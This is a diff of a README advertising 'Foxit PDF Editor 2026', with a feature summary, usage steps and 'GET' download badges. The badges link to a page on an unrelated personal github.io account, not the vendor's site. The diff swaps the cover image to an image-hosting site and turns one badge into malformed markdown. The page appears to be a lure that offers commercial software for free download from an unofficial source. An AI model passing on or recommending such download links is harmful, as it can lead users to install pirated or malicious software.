@@ -2,7 +2,7 @@
 
 Foxit PDF Editor 2026 is a document utility for editing text and images, converting files, recognizing scanned content, and organizing PDF documents. It combines document editing, annotations, signatures, OCR, and security tools for professional document workflows.
 
-![Foxit PDF Editor Interface](https://www.foxit.com/_next/image/?q=90&url=%2Fassets%2Fimages%2Fpdf-editor%2Fext-2-1.png&w=3840)
+![Foxit PDF Editor Interface](https://i.ibb.co/twVCFkpt/Cover.webp)
 
 [![GET — Foxit PDF Editor 2026](https://img.shields.io/badge/GET%20%E2%80%94%20Foxit%20PDF%20Editor%202026-0078D6?style=for-the-badge&logoColor=white)](https://barbaradavisz717.github.io/.github/Foxit-PDF-Editor-2026)
 
@@ -51,7 +51,7 @@ The interface preview illustrates the document editing workspace. The appearance
 6. Select the required editing, conversion, OCR, or annotation tool.
 7. Review the result and save the document in the required format.
 
-[![GET — Foxit PDF Editor 2026](https://img.shields.io/badge/GET%20%E2%80%94%20Foxit%20PDF%20Editor%202026-0078D6?style=for-the-badge&logoColor=white)](https://barbaradavisz717.github.io/.github/Foxit-PDF-Editor-2026)
+[![GET — Foxit PDF Editor 2026](https://www.foxit.com/_next/image/?q=90&url=%2Fassets%2Fimages%2Fpdf-editor%2Fext-2-1.png&w=3840)
 
 ## Compatibility
 
